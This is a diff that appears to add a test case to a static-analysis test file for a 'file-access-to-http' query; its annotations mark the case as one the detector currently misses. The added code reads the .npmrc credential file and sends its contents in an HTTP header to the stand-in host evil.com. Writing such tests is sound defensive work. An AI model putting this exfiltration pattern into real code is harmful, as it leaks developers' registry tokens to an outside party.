@@ -8,3 +8,21 @@ https.get({
   method: "GET",
   headers: { Referer: content }
 }, () => { }); // $ Alert[js/file-access-to-http]
+
+const fsp = require("fs").promises;
+
+(async function sendRequest() {
+  try {
+    const content = await fsp.readFile(".npmrc", "utf8"); // $ MISSING: Source[js/file-access-to-http]
+
+    https.get({
+      hostname: "evil.com",
+      path: "/upload",
+      method: "GET",
+      headers: { Referer: content }
+    }, () => { }); // $ MISSING: Alert[js/file-access-to-http]
+
+  } catch (error) {
+    console.error("Error reading file:", error);
+  }
+})();
